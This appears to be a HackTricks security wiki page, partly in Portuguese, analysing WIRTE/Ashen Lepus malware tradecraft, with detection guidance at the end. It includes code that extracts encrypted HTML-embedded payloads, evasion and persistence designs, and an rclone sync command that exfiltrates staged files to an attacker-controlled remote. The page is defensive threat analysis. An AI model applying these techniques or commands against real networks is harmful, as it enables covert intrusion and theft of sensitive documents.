# Avançado DLL Side-Loading With HTML-Embedded Payload Staging

{{#include ../../../banners/hacktricks-training.md}}

## Tradecraft Overview

Ashen Lepus (aka WIRTE) aproveitou um padrão repetível que encadeia DLL sideloading, staged HTML payloads e modular .NET backdoors para persistir em redes diplomáticas do Oriente Médio. A técnica é reutilizável por qualquer operador porque depende de:

- **Archive-based social engineering**: PDFs benignos instruem os alvos a baixar um arquivo RAR de um site de compartilhamento. O arquivo agrupa um visualizador de documentos EXE com aparência legítima, uma DLL maliciosa nomeada como uma biblioteca confiável (e.g., `netutils.dll`, `srvcli.dll`, `dwampi.dll`, `wtsapi32.dll`) e um `Document.pdf` de isca.
- **DLL search order abuse**: a vítima clica duas vezes no EXE, o Windows resolve a importação da DLL a partir do diretório atual, e o loader malicioso (AshenLoader) é executado dentro do processo confiável enquanto o PDF isca abre para evitar suspeitas.
- **Living-off-the-land staging**: cada estágio posterior (AshenStager → AshenOrchestrator → modules) é mantido fora do disco até ser necessário, entregue como blobs criptografados escondidos dentro de respostas HTML que, de outra forma, parecem inofensivas.

## Multi-Stage Side-Loading Chain

1. **Decoy EXE → AshenLoader**: o EXE faz side-load de AshenLoader, que realiza host recon, encripta-o com AES-CTR e faz POST dele dentro de parâmetros rotativos tais como `token=`, `id=`, `q=` ou `auth=` para caminhos com aparência de API (e.g., `/api/v2/account`).
2. **HTML extraction**: o C2 só revela o próximo estágio quando o IP do cliente geolocaliza para a região alvo e o `User-Agent` corresponde ao implant, frustrando sandboxes. Quando as checagens passam, o corpo HTTP contém um blob `<headerp>...</headerp>` com o payload AshenStager encriptado em Base64/AES-CTR.
3. **Second sideload**: AshenStager é implantado com outro binário legítimo que importa `wtsapi32.dll`. A cópia maliciosa injetada no binário busca mais HTML, desta vez esculpindo `<article>...</article>` para recuperar AshenOrchestrator.
4. **AshenOrchestrator**: um controlador modular .NET que decodifica uma config JSON em Base64. Os campos `tg` e `au` da config são concatenados/hasheados na chave AES, que descriptografa `xrk`. Os bytes resultantes atuam como chave XOR para cada blob de módulo buscado posteriormente.
5. **Module delivery**: cada módulo é descrito através de comentários HTML que redirecionam o parser para uma tag arbitrária, quebrando regras estáticas que procuram apenas por `<headerp>` ou `<article>`. Modules include persistence (`PR*`), uninstallers (`UN*`), reconnaissance (`SN`), screen capture (`SCT`), and file exploration (`FE`).

### Padrão de Análise de Container HTML
```csharp
var tag = Regex.Match(html, "<!--\s*TAG:\s*<(.*?)>\s*-->").Groups[1].Value;
var base64 = Regex.Match(html, $"<{tag}>(.*?)</{tag}>", RegexOptions.Singleline).Groups[1].Value;
var aesBytes = AesCtrDecrypt(Convert.FromBase64String(base64), key, nonce);
var module = XorBytes(aesBytes, xorKey);
LoadModule(JsonDocument.Parse(Encoding.UTF8.GetString(module)));
```
Mesmo que os defensores bloqueiem ou removam um elemento específico, o operador só precisa mudar a tag indicada no comentário HTML para retomar a entrega.

### Auxiliar Rápido de Extração (Python)
```python
import base64, re, requests

html = requests.get(url, headers={"User-Agent": ua}).text
tag = re.search(r"<!--\s*TAG:\s*<(.*?)>\s*-->", html, re.I).group(1)
b64 = re.search(fr"<{tag}>(.*?)</{tag}>", html, re.S | re.I).group(1)
blob = base64.b64decode(b64)
# decrypt blob with AES-CTR, then XOR if required
```
## Paralelos de Evasão de HTML Staging

Recent HTML smuggling research (Talos) highlights payloads hidden as Base64 strings inside `<script>` blocks in HTML attachments and decoded via JavaScript at runtime. The same trick can be reused for C2 responses: stage encrypted blobs inside a script tag (or other DOM element) and decode them in-memory before AES/XOR, making the page look like ordinary HTML. Talos also shows layered obfuscation (identifier renaming plus Base64/Caesar/AES) inside script tags, which maps cleanly to HTML-staged C2 blobs.

## Notas sobre Variantes Recentes (2024-2025)

- Check Point observed WIRTE campaigns in 2024 that still hinged on archive-based sideloading but used `propsys.dll` (stagerx64) as the first stage. The stager decodes the next payload with Base64 + XOR (key `53`), sends HTTP requests with a hardcoded `User-Agent`, and extracts encrypted blobs embedded between HTML tags. In one branch, the stage was reconstructed from a long list of embedded IP strings decoded via `RtlIpv4StringToAddressA`, then concatenated into the payload bytes.
- OWN-CERT documented earlier WIRTE tooling where the side-loaded `wtsapi32.dll` dropper protected strings with Base64 + TEA and used the DLL name itself as the decryption key, then XOR/Base64-obfuscated host identification data before sending it to the C2.

## Criptografia & Endurecimento do C2

- **AES-CTR everywhere**: current loaders embed 256-bit keys plus nonces (e.g., `{9a 20 51 98 ...}`) and optionally add an XOR layer using strings such as `msasn1.dll` before/after decryption.
- **Variações no material de chave**: earlier loaders used Base64 + TEA to protect embedded strings, with the decryption key derived from the malicious DLL name (e.g., `wtsapi32.dll`).
- **Divisão da infraestrutura + camuflagem por subdomínios**: servidores de staging são separados por ferramenta, hospedados em ASNs variados e às vezes fronted por subdomínios com aparência legítima, de modo que queimar uma etapa não expõe o restante.
- **Recon smuggling**: os dados enumerados agora incluem listagens de Program Files para identificar apps de alto valor e são sempre criptografados antes de sair do host.
- **Rotação de URI**: parâmetros de query e paths REST giram entre campanhas (`/api/v1/account?token=` → `/api/v2/account?auth=`), invalidando detecções frágeis.
- **User-Agent pinning + safe redirects**: a infraestrutura C2 responde apenas a strings exatas de UA e, caso contrário, redireciona para sites benignos de notícias/saúde para se misturar.
- **Entrega condicionada**: servidores são geofenced e só respondem a implants reais. Clientes não aprovados recebem HTML não suspeito.

## Persistência & Loop de Execução

AshenStager drops scheduled tasks that masquerade as Windows maintenance jobs and execute via `svchost.exe`, e.g.:

- `C:\Windows\System32\Tasks\Windows\WindowsDefenderUpdate\Windows Defender Updater`
- `C:\Windows\System32\Tasks\Windows\WindowsServicesUpdate\Windows Services Updater`
- `C:\Windows\System32\Tasks\Automatic Windows Update`

Essas tasks relançam a cadeia de sideloading na inicialização ou em intervalos, garantindo que AshenOrchestrator possa requisitar módulos frescos sem escrever no disco novamente.

## Uso de Clientes de Sync Benignos para Exfiltração

Operators stage diplomatic documents inside `C:\Users\Public` (world-readable and non-suspicious) through a dedicated module, then download the legitimate [Rclone](https://rclone.org/) binary to synchronize that directory with attacker storage. Unit42 notes this is the first time this actor has been observed using Rclone for exfiltration, aligning with the broader trend of abusing legitimate sync tooling to blend into normal traffic:

1. **Stage**: copy/collect target files into `C:\Users\Public\{campaign}\`.
2. **Configure**: ship an Rclone config pointing at an attacker-controlled HTTPS endpoint (e.g., `api.technology-system[.]com`).
3. **Sync**: run `rclone sync "C:\Users\Public\campaign" remote:ingest --transfers 4 --bwlimit 4M --quiet` so the traffic resembles normal cloud backups.

Because Rclone is widely used for legitimate backup workflows, defenders must focus on anomalous executions (new binaries, odd remotes, or sudden syncing of `C:\Users\Public`).

## Pontos de Detecção

- Alert on **signed processes** that unexpectedly load DLLs from user-writable paths (Procmon filters + `Get-ProcessMitigation -Module`), especially when the DLL names overlap with `netutils`, `srvcli`, `dwampi`, or `wtsapi32`.
- Inspect suspicious HTTPS responses for **large Base64 blobs embedded inside unusual tags** or guarded by `<!-- TAG: <xyz> -->` comments.
- Extend HTML hunting to **Base64 strings inside `<script>` blocks** (HTML smuggling-style staging) that are decoded via JavaScript before AES/XOR processing.
- Hunt for **scheduled tasks** that run `svchost.exe` with non-service arguments or point back to dropper directories.
- Track **C2 redirects** that only return payloads for exact `User-Agent` strings and otherwise bounce to legitimate news/health domains.
- Monitor for **Rclone** binaries appearing outside IT-managed locations, new `rclone.conf` files, or sync jobs pulling from staging directories like `C:\Users\Public`.

## References

- [Hamas-Affiliated Ashen Lepus Targets Middle Eastern Diplomatic Entities With New AshTag Malware Suite](https://unit42.paloaltonetworks.com/hamas-affiliate-ashen-lepus-uses-new-malware-suite-ashtag/)
- [Hidden between the tags: Insights into evasion techniques in HTML smuggling](https://blog.talosintelligence.com/hidden-between-the-tags-insights-into-evasion-techniques-in-html-smuggling/)
- [Hamas-affiliated Threat Actor WIRTE Continues its Middle East Operations and Moves to Disruptive Activity](https://research.checkpoint.com/2024/hamas-affiliated-threat-actor-expands-to-disruptive-activity/)
- [WIRTE: In Search of Lost Time](https://www.own.security/en/ressources/blog/wirte-analyse-campagne-cyber-own-cert)

{{#include ../../../banners/hacktricks-training.md}}
